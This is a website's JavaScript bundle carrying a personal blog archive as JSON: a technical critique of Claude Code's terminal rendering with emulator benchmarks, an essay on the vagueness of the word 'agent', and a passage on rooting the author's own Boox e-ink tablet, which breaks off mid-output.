"use strict";(self.webpackChunkpersonalpage=self.webpackChunkpersonalpage||[]).push([[8130],{7735:e=>{e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"drawing-monospace-text","metadata":{"permalink":"/blog/drawing-monospace-text","source":"@site/blog/2026-01-26-drawing-monospace-text.md","title":"Is drawing a monospace terminal display straightforward?","description":"Why does Anthropic, the frontier AI lab valued at billions of dollars, releasing the most sophisticated AI coding tools, the undisputed king of agents for 2025, why do they struggle so much with rendering monospace text?","date":"2026-01-26T00:00:00.000Z","tags":[],"readingTime":16.31,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"drawing-monospace-text","title":"Is drawing a monospace terminal display straightforward?","authors":"csressel"},"unlisted":false,"nextItem":{"title":"Agent is a Terribly Non-Specific Term","permalink":"/blog/agent-is-not-specific"}},"content":"Why does Anthropic, the frontier AI lab valued at billions of dollars, releasing the most sophisticated AI coding tools, the undisputed king of agents for 2025, why do they struggle so much with rendering monospace text?\\n\\nTerminal interfaces have always, going back to teletypewriters on paper, and now with digital screens using GPU-accelerated emulators, simply printed out a monospace text grid.\\nThis completely obviates some of the toughest problems in text rendering: the styling is heavily constrained, you often have a single font, one or two colors per grid cell, and the layout and shaping is relatively trivial.[^0]\\nIn the words of Casey Muratori:\\n\\n> Drawing a monospace terminal display is straightforward....<br /><br />\\n> \\\\[8 sentence pseudocode for the full rendering pipeline...\\\\]<br /><br />\\n> ...That\'s it, right? I mean that is the entire renderer. \\n\\nGiven these expectations for terminals, there was consternation from devs when details surfaced on X about the Claude Code rendering architecture:\\n\\n\x3c!-- truncate --\x3e\\n\\n:::twitter\\nMost people\'s mental model of Claude Code is that \\"it\'s just a TUI\\" but it should really be closer to \\"a small game engine\\".\\n\\nFor each frame our pipeline constructs a scene graph with React then<br/>\\n-> layouts elements<br/>\\n-> rasterizes them to a 2d screen<br/>\\n-> diffs that against the previous screen<br/>\\n-> finally uses the diff to generate ANSI sequences to draw<br/>\\n\\nWe have a ~16ms frame budget so we have roughly ~5ms to go from the React scene graph to ANSI written.\\n\\n[- Thariq Shihipar](https://xcancel.com/trq212/status/2014051501786931427)\\n:::\\n\\nResponses ranged widely in tone, but shared a similar message.\\n\\n:::twitter\\n...It\'s one of the worst technical things I\'ve ever heard, posted with a straight face...\\n\\n[- Jonathan Blow](https://xcancel.com/Jonathan_Blow/status/2014920254926029179)\\n:::\\n\\n:::twitter\\nSometimes, developers get hyper-focused on tackling the immediate technical challenges in front of them that it prevents them from reflecting on past decisions.\\nIt\'s like you take a fork in a road, and find you need to climb a mountain.\\nThe faster route to your destination may be to backtrack, and take a more direct route without a mountain in the way...\\n\\n[- Will McGugan](https://xcancel.com/willmcgugan/status/2014341532338606480)\\n:::\\n\\n:::twitter\\nWe apparently live in the clown universe, where a simple TUI is driven by React and takes 11ms to lay out a few boxes and monospaced text...\\n\\n[- Ben Visness](https://xcancel.com/its_bvisness/status/2014381220214309042)\\n:::\\n\\nDuring the storm of criticism, there was at least a little bit of levity:\\n\\n:::twitter\\nLayout 0.9ms<br/>\\nRasterization 2.1ms<br/>\\nDiffing 1.2ms<br/>\\nBuilding the React scene graph 11.0ms<br/>\\nGenerating ANSI sequences 0.8ms<br/><br/>\\n\\nsomeone who is good at the computer please help me budget this. my small game engine is dying\\n\\n[- barrowfaustus](https://xcancel.com/barrowfaustus/status/2014270514550730867)\\n:::\\n\\nBut many of the responses were even ruder (because some people really get off on being smug and critical on the internet).\\nI think there\'s slightly more to it than that, and the Claude Code team obviously had reasons to go in the direction they did.\\nLet\'s see what there is to learn if we think about the tradeoffs and limitations that they\'re working with, instead of coming in with another dunk (React? hahaha amirite).\\nBefore we generalize to some broader comparison points (React vs Ratatui, garbage collected vs not, interpreted vs compiled), lets start off with some more specific estimates for this type of workload, and why the rebuild around diff-based rendering makes sense.\\n\\n## Speed of light (text) in the terminal\\n\\nAny terminal interface is fundamentally limited by two things.\\nTo understand this, it\'s important to consider the basic pseudoterminal (pty) architecture.\\nA program called a \\"virtual terminal emulator\\" like iTerm2, Ghostty, VSCode integrated terminal, etc, is used to run or view any terminal process like Claude Code, NetHack, `cat /dev/urandom`, etc.\\nTo connect these two, the OS opens up a bidirectional communication channel with a \\"master\\" end (the terminal app, what I\'ll call the emulator) and the \\"slave\\" end (the foreground process group, what I\'ll call the process).[^1]\\nData sent from the emulator to the process appears as stdin. Conversely, the process writes to stdout and stderr, which the emulator receives and parses to update the display.\\nAll of these are byte streams containing a mix of Unicode, ANSI escape sequences, and newer and rarer terminal protocol escape sequences. \\n\\nSo imagine you\'ve built a program that will render a terminal interface.\\nBased on the pty architecture, the two limits on the rendering speed are:\\n\\n1. How fast can your program process and respond to new data?\\n   Including `stdin` data like key presses and window resizes, or other data like reading files, network responses, and subprocess results.\\n2. How fast can everything that is *not* your program, mainly the emulator on the other end, receive and render your output bytestream?\\n   Technically the pty communication itself also falls into the \\"not your program\\" category and also includes some work (like the line discipline or context switches), but this is nowhere close to the emulator\'s own bottleneck.\\n\\n:::info\\nUnrelated, but did you know there\'s an actual hard limit on how many terminal interfaces you can have open?! From the Linux pty manpage:\\n\\n\\n```\\n$ man pty\\n...\\nThe Linux kernel imposes a limit on the number of available UNIX\\n98 pseudoterminals. Up to and including Linux 2.6.3, this limit\\nis configured at kernel compilation time (CONFIG_UNIX98_PTYS),\\nand the permitted number of pseudoterminals can be up to 2048,\\nwith a default setting of 256. Since Linux 2.6.4, the limit is\\ndynamically adjustable via /proc/sys/kernel/pty/max, and a\\ncorresponding file, /proc/sys/kernel/pty/nr, indicates  how  many\\npseudoterminals  are  currently  in  use.\\n...\\n```\\n:::\\n\\nTime for some napkin math.\\nImagine we want to rerender as many lines of history as possible: what limits should we expect the bottleneck in the emulator to impose on us?\\nLooking at one of my chats, a 150,000 token chat history contains about 53KB of printed text.\\nThe full count of tokens would be more like 1MB of text, but the majority of that context contains the thinking tokens (not shown) and the tool calls (truncated), so the output is much smaller.\\nHowever, not shown in the raw 53KB of text are the escape codes for colors, bold or dim, and ANSI codes for movement and clearing and printing; altogether this could conceivably double or triple the size in raw bytes.[^2]\\nSo we\'re looking at something in the low hundreds of KB across the pty connection, for the size of each frame of full history render.\\nAssuming a 60 FPS experience, we\'re looking at ~10MB per second (for example, when an active and updating history cell is just off screen, the frequent cause of Claude Code flicker last year).\\n\\nSo how close is this to the theoretical max throughput of the emulator?\\nUsing the [cmuratori/termbench](https://github.com/cmuratori/termbench) repo, I can compare a few terminals\' max throughput on colored text (see Appendix: Emulator Throughput).\\nTo summarize the results from below, modern emulators on modern hardware show result between 30-100MB/s, and legacy emulators are at least an order of magnitude less than that.\\nThe GPU-accelerated terminal emulators on my laptop are right around the median of ~50-60MB/s.\\nNon-GPU-accelerated terminals (that instead allow synchronous frame drops) show similar throughput.\\nThe similarity is unsurprising; the bottleneck doesn\'t come from the rasterization but from the singly threaded CPU-bound logic to track the state machine of ANSI codes.\\nThe variance in my results, at least for the Linux ecosystem, correlates far more with hardware than with the emulator.\\nThe built-in terminal versus GPU accelerated terminal on my Mac Mini shows another performance gap: 30MB/s versus 65MB/s.\\nI don\'t have the appetite to benchmark Windows today, but trust me when I say it\'s generally a cut below the Unix systems.\\nFinally, on a raw Linux kernel TTY (e.g. ttyN) without graphical emulation, using minimal device drivers, no GPU acceleration, and no logic for synchronous frame drops, we see the legacy graphics bottleneck: just over 100KB/s.\\nNot per frame, per *second*.\\n\\nSo the napkin math puts us in 10-50MB/s territory for most setups, and the dreaded flicker scenario (an updating cell offscreen, and a naive history reprint) requires up to 10MB/s.\\nThis doesn\'t *fully* preclude the possibility of a full history rerender for newer setups, but it\'s not looking good!\\nThese benchmarks show a theoretical maximum that is within the same order of magnitude as the required throughput.\\nThis evidence does guarantee the full history rerender will be painful on some legacy terminal emulators or very old hardware, and it will likely introduce frame drops and brief flickers on all but the most optimized setups.\\nThe important detail here is that these limitations are *completely absent any implementation choices of the code itself*.\\nThis is the maximum speed of the pty architecture, for the requirements the Claude Code team is operating under.\\n\\nThis was the most ignorant part of the critique last week, that lampooned the new architecture, or the software choices.\\nI question the requirements the Claude Code team has set, but to implement those requirements they absolutely need a new architecture like they described.\\nGame engine programming is often impressive because after saturating performance bottlenecks in the hardware or OS or another abstraction outside your control, you need to design a smarter approach for your workload.\\nIn that light, Thariq\'s comparison is fair.\\n\\n## The new architecture\\n\\n### A retained mode renderer\\n\\nThe details of their new architecture solve this throughput issue. Rather than forcing entire documents down the pty bottleneck, the new architecture implements the terminal equivalent of a retained mode interface.\\nThe emulator retains the screen state between frames, and the program is expected to push down only the minimal ANSI codes to move the cursor (`CUP`) and update specific cells.\\nAnyone familiar with the Ratatui library knows this pattern. The application still describes the UI every frame, but the new renderer only transmits the changes.\\n\\nAs compared to the React virtual DOM:\\n\\n* **On the Web:** DOM updates are slow, so we use VDOM to minimize *browser repaints*.\\n* **In the Terminal:** The byte stream is fast, but the *parsing* is the bottleneck.\\n\\nBy treating the terminal as a grid of cells rather than a tree of objects, the terminal avoids any \\"parser jitter.\\"\\nHowever, implementing this inside a React-like framework means they are using a nested object tree.\\nNot only is this algorithmically more distant from the text grid, it is still creating thousands (tens of thousands?) of short-lived objects per frame to represent that grid of characters.\\nThe new design has fixed the I/O bottleneck, but they likely increased the GC pressure, moving the accidental complexity elsewhere.\\n\\nThis leaves us with the remaining, more permanent issue that Claude Code is now dealing with: fighting the framework.\\n\\n### Let history be history\\n\\nTerminal emulators are optimized for two distinct scenarios. \\n\\n1. **The Scrollback**: the program turns information over to the emulator to own.\\n   Immutable, fast, and forgotten by the program.\\n   The pty is explicitly optimized for direct copyover of plain Unicode data.\\n2. **The Viewport**: information fully owned by the app.\\n   Interactive, temporary, easily customized UI, dynamic rewraps.\\n   The altscreen mode offers a separate buffer, fully controlled by the foreground process (like neovim or Emacs or top).\\n   Limited height viewports can also be implemented below the history (like `fzf --inline`).\\n\\nClaude Code has decided to violate this contract. It decides to treat the *entire* scrollback as a reactive viewport.\\nOstensibly, there are some benefits over altscreen: native search (cmd-F or similar), native text selection, native clipboard interactions, or a longer list of multiplexer features.\\nBut the cost is fragility.\\n\\nWhen the context gets too long, Claude \\"compacts\\" the history.\\nIn doing so, it often clears the *entire* terminal scrollback, including history from before the Claude Code session!\\nSimilarly, \\"fake fullscreen\\" features (like ctrl+o extended output) rewrite the history instead of using altscreen, so any failure scenario risks a broken scrollback that you can\'t reference or copy from.\\nThe most convenient feature is history rewrapping on window resize, and that is gone the moment you quit Claude Code, leaving you with the static history artifact that you were briefly told not to settle for!\\n\\n### Non-pessimization of the requirements\\n\\nPessimization involves crippling the performance of your program, either by assuming requirements that don\'t exist, or ignoring constraints that do.\\nThere\'s an attempt here to support an ambitious set of requirements, and I applaud the Claude Code team for pushing boundaries on terminal experiences.\\nHowever, every one of the tradeoffs I just described around fragility and fighting the emulator is just not my preference as a user.\\nIf I want a scrollable dynamic interface, there is altscreen.\\nIf I want a dynamic viewport below longer history, there are normal `stdout` conventions.\\nIf I need the rewrapped history, I can `/resume` the conversation in a new window.\\nHeck, even introducing a separate `/rewrap` command would make me happier than a system that constantly fights the terminal emulator for custody of the pixels.\\n\\nIn their design, they\'ve pessimized the wrong thing.\\nTheir initial requirements assumed that rerendering is free, and responsiveness are paramount.\\nThis is incorrect &mdash; the history rerenders have proved to not be free, and I only care about responsiveness in the small section at the bottom that I interact with!\\n\\nI\'ve found that OpenAI struck a better balance with the Codex CLI design, using a double-buffered history for active vs completed cells.\\nIt brings Ratatui performance with diff-based rendering for free, has zero-overhead thread safety, and the raw speed of a non-GC compiled language.\\n\\nFull disclosure (full plug at the end), I\'ve been working on a distant fork of the Codex architecture to wrap the Claude agent and other agent choices.\\nIt feels nice using Opus 4.5 without flicker, stuttering, artifacts, or my terminal history getting cleared!\\n\\n## Some takeaways\\n\\nBased on these tidbits from the Claude Code team, I imagine they now have the full diff-based TUI rendering engine built out in TypeScript.\\nI don\'t know in which areas it\'s at feature parity, superiority, or inferiority with similar frameworks like Ratatui.\\nBut having seen the general shape and complexity of code that goes into Ratatui, it is a great milestone for the Claude Code team to deliver their own diff-based engine.\\nDespite the immature reactions online, this was definitely a net positive for Claude Code, and puts them much closer to my performance expectations for a cutting-edge TUI.\\nWhile I consider the requirements they\'ve inflicted on themselves to be not my personal cup of tea, I appreciate them experimenting with the limitations of interactivity in the terminal.\\n\\nThere are a few takeaways I\'m left with, if I had to offer my remaining 2c (on top of the 98c above):\\n\\n1. **Why fight the framework:** Every feature that modifies history risks destroying it.\\n   Terminal users have learned to trust their scrollback as immutable log, and I personally don\'t like when programs break that trust.\\n2. **Accidental complexity moves elsewhere:** I still question if rendering a text grid via an object tree (DOM/React) is appropriate for an ANSI terminal.\\n   With a long chat history, creating or destroying thousands of node objects can easily cause a GC pause, and a frame drop may exhibit a blank screen or partially drawn UI &mdash; more flicker!\\n3. **Language tradeoffs:** Interpreted languages often justify the performance hit with \\"portability.\\"\\n   But in the terminal, the \\"non-standard environments\\" (Windows, old Unix distros, Android devices, etc) are *exactly* where you need the fastest performance... because they have the slowest emulators!\\n\\nDespite the improvements to their architecture, I can\'t say I would lean on a GC interpreted language like JS for this type of work.[^3]\\nClearly they are thinking about some of these concerns, given the acquisition of Bun.\\nAnd clearly they are undeterred by the risks, given... The acquisition of Bun.\\nI\'m impressed by the work within the Bun project to date, and it will be interesting to see what their next chapter within Anthropic looks like.\\nAs it relates to Claude Code, this feels kind of like buying more RAM because your program has a memory leak.\\nHowever, I have to imagine it\'s a strategic decision that goes beyond just one product team, and they see a broader need in their portfolio for performant JavaScript runtimes.\\n\\n---\\n\\n## P.S., the **Nori** Approach\\n\\nIf you\'re interested in these topics, or just want a terminal agent that doesn\'t flicker, check out the work we\'re doing at [**Tilework**](https://tilework.tech/)!\\n\\n[Our **Nori CLI**](https://github.com/tilework-tech/nori-cli) is a distant fork of the Codex CLI, with support for Claude Code.\\nWe built this on the philosophy that tools should be fast, intuitive, and respect your terminal\'s native behavior.\\nWe\'re working on building the things that make us faster at building the things that make us faster, and tools like this are part of our long term vision to help developers fully own (and enjoy) their own toolbox.\\n\\n---\\n\\n## Appendix: Emulator Throughput\\n\\n[Thanks to Casey Muratori\'s termbench project!](https://github.com/cmuratori/termbench)\\n\\nThese throughputs are explicitly *not* the output rendered per second;\\nthey are the input \\"accepted\\" per second.\\nBecause of this, they provide a guaranteed max on what your terminal could render out,\\nbut do *not* necessarily establish a viable minimum.\\nFor example, COSMIC achieves the top result, but actually exhibits long stutters and freezes throughout the benchmark.\\n\\n- **ManyLine:** Throughput when printing many short lines.\\n- **LongLine:** Throughput when printing long lines wrapping the screen.\\n- **FGPerChar:** Throughput when changing foreground color every character.\\n- **FGBGPerChar:** Throughput when changing foreground and background color every character.\\n- **TermMarkV2:** A balanced benchmark simulating complex terminal usage.\\n\\nAll numbers in megabytes per second.\\nThe laptop environment is running Pop!OS 24.04 with a Ryzen 7 6800U.\\nThe desktop environment is running Pop!OS 24.04 with a Ryzen 5 7600X.\\nThe Mac Mini environment is running macOS 26.2 with an Apple M4 CPU.\\n\\n| Environment | Emulator           | TermMarkV2 | ManyLine  | LongLine   | FGPerChar  | FGBGPerChar |\\n| ---         | ---                | ---        | ---       | ---        | ---        | ---         |\\n| Desktop     | **COSMIC**         | **108.8**  | 81.6      | **106.5**  | **196.4**  | **180.6**   |\\n| Desktop     | **Alacritty**      |   96.6     | **82.1**  | 89.5       |   140.7    |   136.3     |\\n| Laptop      | **COSMIC**         | **75.0**   |   53.5    | 77.3       | **142.2**  | **127.6**   |\\n| Mac Mini    | **Ghostty**        | **65.3**   | **82.0**  | **92.3**   | **66.9**   | **34.6**    |\\n| Laptop      | **Alacritty**      | 65.2       | 49.8      | 63.7       | 113.5      | 103.1       |\\n| Desktop     | **GNOME**          | 64.1       | 40.0      | 102.6      | 87.4       | 87.2        |\\n| Desktop     | **Ghostty**        | 60.0       | 57.2      | 75.4       | 49.1       | 51.7        |\\n| Laptop      | **GNOME**          | 56.2       | 34.4      | **101.6**  | 78.7       | 68.4        |\\n| Laptop      | **Ghostty**        | 53.7       | **55.2**  | 77.5       | 35.7       | 40.3        |\\n| Mac Mini    | **Terminal.app**   | 34.7       | 33.1      | 46.6       | 24.3       | 30.2        |\\n| Laptop      | *Virtual tty3*\\\\*   | *0.3*      | *0.2*     | *5.0*      | *9.0*      | *9.1*       |\\n\\n> **Notes:**\\n>\\n> \\\\* **Virtual tty3**: This benchmark ran on a virtual TTY (`/dev/tty3`) without a windowing system.\\n> It used the `TermMarkV2 Tiny` profile (in order to complete in under 10 minutes), whereas all other emulators used `TermMarkV2 Normal`.\\n>\\n> \\\\** **Highest Throughput**: The highest value for each column within a specific environment is **bolded**.\\n\\n---\\n\\n[^0]: As compared to the tricky requirements handled by [HarfBuzz](https://github.com/harfbuzz/harfbuzz) for most web browsers or native apps.\\n[^1]: These are the historical terms used throughout the Unix documentation. I personally find these terms completely unhelpful to remember what the responsibilities here are, so for this user interface centric discussion I\'m just referring to the emulator and process group respectively.\\n[^2]: If you think this is unlikely, see previous, re: \\"napkin math\\".\\n[^3]: When building low-level developer tools, Rust is to me is the much better fit: compile-time thread safety (something something \\"fearless concurrency\\"), zero GC, native target optimizations, and indelible boundaries around the unsafe code that necessarily arises with `libc` and `*nix` calls."},{"id":"agent-is-not-specific","metadata":{"permalink":"/blog/agent-is-not-specific","source":"@site/blog/2025-10-26-agent-is-not-specific.md","title":"Agent is a Terribly Non-Specific Term","description":"While there\'s still a chance to throw more terminology at the wall, I think we could do better.","date":"2025-10-26T00:00:00.000Z","tags":[],"readingTime":3.47,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"agent-is-not-specific","title":"Agent is a Terribly Non-Specific Term","authors":"csressel"},"unlisted":false,"prevItem":{"title":"Is drawing a monospace terminal display straightforward?","permalink":"/blog/drawing-monospace-text"},"nextItem":{"title":"E Ink tablets: Rooting a Boox Go 10.3","permalink":"/blog/eink-tablet-part1"}},"content":"While there\'s still a chance to throw more terminology at the wall, I think we could do better.\\n\\nI think that there are more specific names we have yet to hit on, for this year\'s applications of generative AI.\\nNot only are more specific names possible, they are very useful when communicating between engineers, or coming up with useful specifications for projects. Imagine that every time you wanted to deploy software in 2015, another engineer on your team asked if it was going to \\"the cloud.\\" Not asking if it\'s going into a Docker container, or running on bare metal on EC2, or using that new tool \\"kubernetes,\\" but literally asked \\"hey have you gone to the cloud yet.\\" It would be pretty difficult to have a meaningful engineering conversation about what you\'ve implemented.\\n\\n\x3c!-- truncate --\x3e\\n\\nThat\'s the way I feel about the word \\"agent.\\"\\n**Particularly in engineer-to-engineer conversations.**\\nSo far the only commonality I\'ve seen in the definition of \\"agent\\" has been: \\"thing I trust at least a little bit to do something.\\"\\nIt\'s essentially a definition by absentia; if it does anything more than just spit text back at you, call it an agent.\\nAs a result, when engineers and founders use this term in a technical context I don\'t get a clearer sense for their concept.\\n\\nHere\'s an example of how this could be done better: so-called \\"coding agents\\" like Claude Code and Cursor and the rest could be much better termed **RETLs: read eval tool loops**. This is obviously based on a REPL, which is a read eval print loop. However, in this use case the order of operations is:\\n\\n- **Read**: user input, previous outputs, MCP for tools, etc; add anything to the prompt or context\\n- **Eval**: model inference\\n- **Tool**: if the result declares a tool then call it\\n- **Loop**: if we haven\'t declared completion then go to the start\\n\\nThese RETL tools are often put in the category of \\"synchronous agentic coding.\\" Likewise, there will need to be terminology for architectures in the asynchronous category. In the agentic coding space, these would be the products currently explored by Devin and Factory and similar.\\n\\nI\'ve noticed that this second model is architecturally very similar to [coroutines](https://en.wikipedia.org/wiki/Coroutine), where each model is a program, and the suspend/resume is determined by explicit delegation of control to a model, which can `yield` back to the caller, or `yield from` another model or models (or \\"sub-agents\\"... there\'s that word again!), or lastly can use another model in a blocking manner.\\nBut I\'m not the one with the frame of reference to name things in that space, and I certainly don\'t know the ins and outs of useful terminology that was already coined in the AI research world, like multi-agent systems, agent-based model, ACTOR model, etc.\\n\\nHowever, after working pretty extensively with [OpenCode](https://opencode.ai/) (both as a power user and also to rewrite parts of the tool for my own use) I\'ve noticed that the confines of a very common architectural pattern has emerged around the RETL definition above.\\nThe RETL definition isn\'t just a common trend within the flurry of agentive product releases this year, it\'s both the necessary and the complete set of behaviors that describe these products!\\nAdmittedly for a broad definition of \\"tool,\\" that encompasses MCP servers and sub-RETLs both.\\n\\nIf there are other terms that fill this gap already, please let me know!\\nI\'ve heard of \\"reflection loops,\\" but that seems to be a prompting technique (equivalent to \\"self-critique\\").\\nThe most common term I\'ve heard for Cursor/Claude Code/Codex/OpenCode is either \\"coding tools\\" or \\"agentic coding,\\" the first of which fails to distinguish from tab completion and the second of which fails to distinguish from the asynchronous architectures I mentioned above.\\nSo in the meantime, I\'ll be name-droppinng RETL to reference these products, \x3c!-- At least until someone more knowledgeable brings out the Mean Girls quote on me: \'Clifford, stop trying to make \\"RETL\\" happen, it\'s not going to happen.\' --\x3e and we\'ll see over time what conensus emerges on the bounds of one architecture vs another."},{"id":"eink-tablet-part1","metadata":{"permalink":"/blog/eink-tablet-part1","source":"@site/blog/2025-08-12-eink-tablet-part1.md","title":"E Ink tablets: Rooting a Boox Go 10.3","description":"Motivation","date":"2025-08-12T00:00:00.000Z","tags":[],"readingTime":15.09,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"eink-tablet-part1","title":"E Ink tablets: Rooting a Boox Go 10.3","authors":"csressel"},"unlisted":false,"prevItem":{"title":"Agent is a Terribly Non-Specific Term","permalink":"/blog/agent-is-not-specific"},"nextItem":{"title":"Rock paper scissors consequentialism","permalink":"/blog/rps-consequentialism"}},"content":"## Motivation\\n\\nI haven\'t worked on a lower-level systems project in a while, I haven\'t worked on reversing or binaries since a brief stint in college, I\'ve never worked on anything in the Android software ecosystem, and I haven\'t yet written or modified Linux device drivers myself.\\n\\nDirectly in line with those goals is an unmet hardware need: my growing desire for an E Ink tablet that will run an open source Android build.\\nI\'ve heard that some users have gotten LineageOS running on a Hisense, which is in the neighborhood of what I would be interested in.\\nHowever, my note taking preferences require the screen real estate of a tablet. \\nFor several months, I\'ve used a Boox Go 10.3 as an untrusted device solely for epub reading.\\nAs time has gone on, this tablet\'s full Play Store access on an Android build hints at tantalizing possibilities: the congruous feeling of a paper-like calendar or planner, an E Ink optimized RSS reader, note taking and email on the go, all further enabled by my obsession with small form factor wireless keyboards.\\nWith that dream in mind, this is the perfect fit to learn a bit about AOSP and device drivers.\\n\\n## Project Goals\\n\\nWith my lay understanding of the hardware/software boundary in the mobile ecosystem, long term I would be curious how far I can get towards deploying an Android custom ROM to the Boox Go 10.3.\\nThis unfortunately entails the very tough challenge of a full device bringup.\\nBoox has made this even tougher by not open sourcing either their kernel or the device tree.\\nFor this to be minimally usable, it would require support for:\\n\\n\x3c!-- truncate --\x3e\\n- Display driver (Carta 1200 10.3 inch)\\n- Capacitive touch controller\\n- Wireless chipset driver (wifi + bt)\\n\\nAnd nice-to-have\'s include:\\n\\n- Wacom EMR driver\\n- any quality of life improvements on the screen refresh or tearing\\n- E Ink friendly UI elements (lock screen, menus, launcher)\\n- emulate some of the Onyx per-app optimizations (refresh modes, dark color enhancement, light color filter, etc).\\n\\nI know I\'ll have to further define or correct that mile high overview as I go. It might even be possible that I need to re-target my work on a different hardware platform! (Whether that\'s a different Boox model, a reMarkable for the [better DX](https://developer.remarkable.com/documentation/software-stack), or the HiSense.)\\nFurther resources:\\n\\n- LineageOS\'s engineering series:\\n    - https://lineageos.org/engineering/Qualcomm-Firmware/\\n    - https://lineageos.org/engineering/HowTo-SELinux/\\n    - https://lineageos.org/engineering/HowTo-Debugging/\\n- Some existing tools:\\n    - https://github.com/bkerler/edl\\n    - https://github.com/ssut/payload-dumper-go\\n    - https://github.com/Hagb/decryptBooxUpdateUpx\\n    - https://github.com/onyx-intl (limited and out of date, it looks like)\\n    - https://wiki.postmarketos.org/wiki/ONYX_BOOX_Go_6_(onyx-go6)\\n- and I know later on in this side project, I\'ll have to get real comfortable on [XDA forums](https://xdaforums.com)\\n\\n\x3c!-- bringups: https://blog.realogs.in/android-device-tree-bringup/ and https://gist.github.com/mvaisakh/1a45694e33584592e8fae37fe29d757d --\x3e\\n\x3c!-- ROMs: https://xdaforums.com/t/guide-complete-android-rom-development-from-source-to-end.2814763/ and https://xdaforums.com/t/guide-video-tutorial-how-to-build-custom-roms-and-kernels-10-p-o-n-m-l.3814251/ --\x3e\\n\\n## Rooting the Device\\n\\nMy first task is to root the device (generally following [existing](https://blog.tho.ms/hacks/2021/03/27/hacking-onyx-boox-note-air.html) [works](https://cake.moe/blog/rooting-boox-tab-ultra/), by Thomas Hollstegge and Mia respectively, working on different Boox devices).\\nThis will provide far greater access on the device, as well as images of the current system partitions.\\n\\nOnyx firmware is no longer listed online, so I needed to get the new update off my device itself.\\nMy current build was `2024-10-24_10-59_3.5.4_2b800b967`, so I was able to re-open the Onyx Launcher I hadn\'t used in some time, and download the pending firmware update.\\nI transferred the build of `2025-06-18_14-27_4.0.2-rel_0614_35a32af51` to my workstation, and I was able to decrypt the firmware using the [Hagb/decryptBooxUpdateUpx](https://github.com/Hagb/decryptBooxUpdateUpx) repo:\\n\\n```\\npython3 DeBooxUpx.py Go103 update.upx\\n```\\n\\nThe resulting directory is:\\n\\n```\\nupdate.zip\\n\\n\ud83d\udcc2 META-INF\\n  \ud83d\udcc2  com\\n    \ud83d\udcc2  android\\n      \ud83d\udcc4 metadata\\n      \ud83d\udcc4 metadata.pb\\n      \ud83d\udcc4 otacert\\n\ud83d\udcc4 apex_info.pb\\n\ud83d\udcc4 care_map.pb\\n\ud83d\udcc4 payload.bin\\n\ud83d\udcc4 payload_properties.txt\\n```\\n\\n:::info\\n\ud83e\udd16 Gemini 2.5 Pro says:\\n\\nRoot Directory Files\\n\\nThese files are central to defining and applying the update.\\n\\n- apex_info.pb: This protocol buffer file contains information about any APEX (Android Pony EXpress) files within the update. APEX is a container format used to deliver updatable, lower-level system modules. This file specifies the list of APEX files included in the payload.\\n- care_map.pb: This file is primarily associated with A/B (seamless) system updates. It contains information that helps the update engine determine how to apply the update to the inactive partition slot while the user\'s system continues to run on the active slot. It can also detail which partitions can be wiped or if a data wipe is required.\\n- payload.bin: This is the core of the update package. It\'s a binary file that contains the compressed images of the various system partitions to be updated, such as system, vendor, and boot. For A/B updates, this payload is streamed to the inactive partition and applied.\\n- payload_properties.txt: This text file contains properties and metadata about the payload.bin file. It includes information such as the payload\'s size, hash, and header details. This allows the system to verify the integrity of the payload before and during the update process.\\n:::\\n\\nThe payload can be split out into separate partition images using a tool like [ssut/payload-dumper-go](https://github.com/ssut/payload-dumper-go?tab=readme-ov-file), or using the open source EDL implementation to dump the existing partitions. Since we already have the payload, we can for now skip the headache with EDL (where we have to find an applicable loader file for this SoC). We run:\\n\x3c!-- loaders: https://www.temblast.com/edl.htm and https://www.temblast.com/ref/loaders.htm --\x3e\\n\\n```\\n./payload-dumper-go payload.bin\\n\\nls -lh\\ntotal 3.8G\\n-rwxr-xr-x 1 clifford clifford 156K Jul  9 10:06 abl.img\\n-rwxr-xr-x 1 clifford clifford  96M Jul  9 10:06 boot.img\\n-rwxr-xr-x 1 clifford clifford 8.0M Jul  9 10:06 dtbo.img\\n-rwxr-xr-x 1 clifford clifford  35M Jul  9 10:06 modem.img\\n-rwxr-xr-x 1 clifford clifford 592M Jul  9 10:06 product.img\\n-rwxr-xr-x 1 clifford clifford  96M Jul  9 10:06 recovery.img\\n-rwxr-xr-x 1 clifford clifford 2.2G Jul  9 10:07 system.img\\n-rwxr-xr-x 1 clifford clifford 361M Jul  9 10:06 system_ext.img\\n-rwxr-xr-x 1 clifford clifford 8.0K Jul  9 10:06 vbmeta.img\\n-rwxr-xr-x 1 clifford clifford 4.0K Jul  9 10:06 vbmeta_system.img\\n-rwxr-xr-x 1 clifford clifford 480M Jul  9 10:06 vendor.img\\n-rwxr-xr-x 1 clifford clifford 3.1M Jul  9 10:06 xbl.img\\n```\\n\\nSo let\'s patch the boot image to prep for install of Magisk, apply the update in Onyx, and finally flash the new boot image.\\nMagisk easily patches the image to produce `magisk_patched-29000_F55YV.img`, but that\'s where the struggles begin.\\nWithin fastboot, both `boot` and `flash` send the image to the device, but then finally return command not found.\\n\\nBig set back here, I was hoping not to faff around with EDL and loaders and similar to start.\\nHowever, with those commands disabled there isn\'t another way to flash the boot image.\\nTime to setup EDL properly!\\nThe EDL repo does some global system installation that I wasn\'t eager about; the udev rules make sense, but the system python dep installation isn\'t my favorite.\\nI got the EDL repo working after some trial and error:\\n\\n```\\nsudo bash install-linux-edl-drivers.sh  # Required changes\\nuv venv -p 3.13                         # Setup an isolated environment\\nuv pip install -e .                     # Install the project deps in devmode\\nsource .venv/bin/activate\\n./edl  --help                           # Test that the command works\\n```\\n\\nI had some issues with getting `edl printgpt` to work, as there\'s no loader for SM6225 in the provided submodule, and while testing out various loaders suggested online my device became unresponsive to all EDL commands.\\nAfter holding down the power button for long periods until the device rebooted out of recovery mode, I was able to reboot to EDL again and [one of the loaders I had tried earlier](https://github.com/bkerler/Loaders/issues/97) (formerly with no luck) was now working!\\n\\n```\\nedl --loader sm6225.bin printgpt\\n```\\n\\n<details>\\n<summary>\\nExample Partition Output\\n</summary>\\n\\n```plaintext\\nQualcomm Sahara / Firehose Client V3.62 (c) B.Kerler 2018-2025.\\nmain - Using loader sm6225.bin ...\\nmain - 